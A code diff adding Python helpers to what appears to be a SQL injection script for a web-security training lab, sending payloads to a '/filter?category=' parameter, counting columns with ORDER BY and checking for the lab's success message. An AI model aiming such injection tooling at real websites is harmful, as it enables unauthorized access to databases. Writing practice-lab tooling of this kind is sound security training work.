@@ -1,6 +1,33 @@
 from proxies import proxies
 from pprint import pprint
 import re
+from urllib.parse import quote 
+import requests
+
+def default_solve(url, payload):
+    if not payload or not url:
+        print("[!] Error no url or payload provided")
+        return False
+
+    r = requests.session()
+    print("[~] Testing payload: {}".format(url + '/filter?category=' + quote(payload)))
+    res = r.get(url + '/filter?category=' + quote(payload), verify=False, proxies=proxies)
+    if res.status_code == 504:
+        print("[!] Error 504: Session Timeout")
+        return False
+    elif res.status_code == 500:
+        print("[!] Error 500: Invalid SQLi")
+
+    if "Congratulations, you solved the lab!" in res.text:
+        print("[+] ================================")
+        return True
+
+
+def scan_url(url):
+    r = requests.Session()
+    col_count = sqli_count_columns(r, url)
+    get_column_types(r, url, col_count)
+    return
 
 # Determine the amount of columns using order-by clauses
 def sqli_count_columns(session, url):
